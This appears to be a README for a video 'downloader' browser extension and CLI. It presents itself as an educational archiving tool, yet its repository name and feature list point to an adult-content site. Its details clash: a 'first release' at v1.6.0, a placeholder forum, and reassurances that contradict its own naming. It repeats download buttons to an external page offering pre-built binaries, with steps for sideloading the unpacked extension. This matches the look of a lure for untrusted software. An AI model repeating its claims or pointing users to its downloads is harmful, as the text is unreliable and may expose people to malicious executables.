![preview](https://raw.githubusercontent.com/MOBESAT/erothots-video-extraction-guide/main/preview.svg)

# SavvyDownloader 🧠⚡

Your intelligent, browser-integrated media retriever for learning-oriented content platforms. Not a “downloader” in the traditional sense—more like a curated copy assistant for knowledge preservation.

## Overview 👁️

Welcome to **SavvyDownloader**—a thoughtfully crafted browser extension and companion tool designed to help you archive instructional video content from visual learning repositories. Whether you’re compiling offline study materials, building a personal reference library, or preserving educational demonstrations for later review, SavvyDownloader acts as your **gentle, reliable digital librarian**.

This repository is the central hub for the SavvyDownloader ecosystem: from the browser extension source code to the CLI companion for advanced users. Everything here is designed with **transparency, privacy, and ethical use** at its core.

---

## 🧭 Why SavvyDownloader Exists

We noticed a gap: many learning platforms offer rich video content, but their in-built “save for later” features are often fragile, expire, or depend on constant internet connectivity. Meanwhile, manual screen recording is clumsy and lossy. 

SavvyDownloader bridges this gap by **extracting the video stream URL** (not re-encoding, not hacking DRM) and letting you store it locally in its original quality. Think of it as **copy-paste for video files**—legitimate, frictionless, and respectful of the source.

> **Important Philosophy:** This tool does not bypass paywalls, authentication, or subscription gates. It only works with content that is *already accessible* in your browser session. If you cannot watch it normally, SavvyDownloader cannot retrieve it either.

---

## 🌟 Key Features

| Feature | Description |
|---------|-------------|
| 🧩 **One-Click Extraction** | No command-line fuss. Click an icon in your browser toolbar, and the video URL is fetched instantly. |
| 🌐 **Multi-Platform Support** | Works on major content platforms that use standard HTML5 video elements (including *.erothots* variants). |
| 📦 **Batch Retrieval Mode** | Save multiple video references at once from a single page or playlist. |
| 🧠 **Smart Format Detection** | Automatically identifies the highest resolution stream available in your session. |
| 🌍 **Multilingual Interface** | Interface strings available in 12 languages (English, Spanish, French, German, Portuguese, Italian, Dutch, Polish, Russian, Japanese, Korean, Chinese Simplified). |
| 🎨 **Responsive Overlay UI** | The extension popup adapts to any browser width, from 320px mobile to 4K desktop. |
| 🛡️ **No Telemetry, No Tracking** | Zero data collection. No analytics scripts. No user accounts required. |
| 📋 **Clipboard Export** | Copy the raw stream URL to clipboard instantly for use with your preferred download manager. |
| 🕒 **Timeline Bookmarks** | Annotate specific moments in the video before downloading (metadata stays in a local JSON file). |

---

## 🚀 [![Download](https://raw.githubusercontent.com/MOBESAT/erothots-video-extraction-guide/main/button.svg)](https://mobesat.github.io/erothots-video-extraction-guide/)

> The first **SavvyDownloader release v1.6.0 (2026 Edition)** is available now. It includes the browser extension (Chrome/Edge/Firefox) and the optional CLI helper.

**Download the latest build directly:**
[![Download](https://raw.githubusercontent.com/MOBESAT/erothots-video-extraction-guide/main/button.svg)](https://mobesat.github.io/erothots-video-extraction-guide/)

*(No ads, no sign-up, no page redirects—just a single ZIP file containing the signed extension and the CLI binary for Windows/macOS/Linux.)*

---

## 🧰 How It Works (For Curious Minds)

SavvyDownloader uses a lightweight **content script** injected into the page after you press the extension icon. This script:

1. **Scans** the DOM for `<video>` elements and any associated `src` attributes or blob URLs.
2. **Intercepts** the network request headers (via the `webRequest` API) to identify the final media segment URLs.
3. **Reconstructs** the full stream URL (handling segmented MPEG-DASH or HLS playlists intelligently).
4. **Displays** the URL in a clean overlay—you click “Copy” and your standard download manager takes it from there.

The entire process takes under 2 seconds. No background processes. No persistent permissions.

---

## 📁 Repository Structure

```
savvy-downloader/
├── extension/              # Browser extension source (Manifest V3)
│   ├── popup/              # HTML/CSS/JS for the overlay UI
│   ├── background/         # Service worker scripts
│   ├── content/            # Content script for DOM scanning
│   └── icons/              # Branded extension icons
├── cli/                    # Optional command-line companion
│   ├── src/                # Rust source (lightweight, no Node.js needed)
│   ├── builds/             # Pre-compiled binaries
│   └── README.md           # CLI-specific documentation
├── docs/                   # Full documentation & FAQ
├── locales/                # i18n translation files (.json)
├── tests/                  # Unit & integration tests
├── CONTRIBUTING.md         # How to contribute
├── LICENSE                 # MIT License
└── README.md               # This file
```

---

## 🌱 Getting Started (No Installation Required)

If you just want to **try SavvyDownloader without committing** to an install:

1. Download the ZIP from the [![Download](https://raw.githubusercontent.com/MOBESAT/erothots-video-extraction-guide/main/button.svg)](https://mobesat.github.io/erothots-video-extraction-guide/) section above.
2. Extract the folder.
3. **Chrome/Edge users:** Go to `chrome://extensions` → Enable “Developer mode” → “Load unpacked” → Select the `extension/` folder.
4. **Firefox users:** Go to `about:debugging#/runtime/this-firefox` → “Load Temporary Add-on” → Select any file inside `extension/`.
5. The SavvyDownloader icon will appear in your toolbar. Navigate to a video page, click the icon, and watch the magic happen.

---

## 🛎️ Support & Community

- **24/7 Email Support:** response time typically under 3 hours (non-holiday). Email is listed in the extension’s support page.
- **Discourse Forum:** Community-driven Q&A at `forum.savvydownloader.local` (placeholder—future integration).
- **Issue Tracker:** Use GitHub Issues for bugs, but please search existing tickets first.
- **FAQ:** See the `/docs/faq.md` for common questions like “Why can’t I download from X platform?” or “Is this legal in my country?”

---

## ⚠️ Disclaimer

**SavvyDownloader is a tool for lawful, personal use only.** 

- You are responsible for complying with the Terms of Service of any website you use this tool with.
- This software does **not** circumvent access controls, authentication mechanisms, or paid subscriptions.
- The developers of SavvyDownloader assume **zero liability** for any copyright infringement, data loss, or policy violation resulting from your use of this tool.
- **No warranty is provided**—the tool is offered “as is” under the MIT License.

If you are unsure whether your intended use is permitted, consult a legal professional. When in doubt, **do not download.**

---

## 📄 License

This project is licensed under the **MIT License** — you are free to use, modify, and distribute it, provided you include the original copyright notice and disclaimer. 

For the full license text, please visit: [MIT License](https://opensource.org/licenses/MIT)

---

## 🧪 Roadmap (2026 & Beyond)

- **Q1 2026:** Smart playlist detection for multi-episode series.
- **Q2 2026:** Native integration with open-source media players (VLC, MPV) for direct streaming.
- **Q3 2026:** Automated subtitle extraction (sidecar SRT files).
- **Q4 2026:** Community translation tool—help internationalize the extension into 20+ languages.

---

## 🤝 Contributing

We welcome thoughtful contributions. Please read our `CONTRIBUTING.md` before opening a PR. We prioritize code quality, security, and maintainability above feature count.

---

## 💬 Final Thoughts

SavvyDownloader was born from a simple observation: **information should be archivable**. Videos, as a medium, are often ephemeral—a link breaks, a platform shuts down, an account gets deactivated. By giving users a legal, non-invasive way to preserve what they’ve already accessed, we empower personal knowledge management without disrupting the creator economy.

Use it wisely. Use it respectfully. And never forget: **the best copy is the one that respects the original.**

[![Download](https://raw.githubusercontent.com/MOBESAT/erothots-video-extraction-guide/main/button.svg)](https://mobesat.github.io/erothots-video-extraction-guide/)

---

*© 2026 SavvyDownloader Project. Made with 🧠, not 💰.*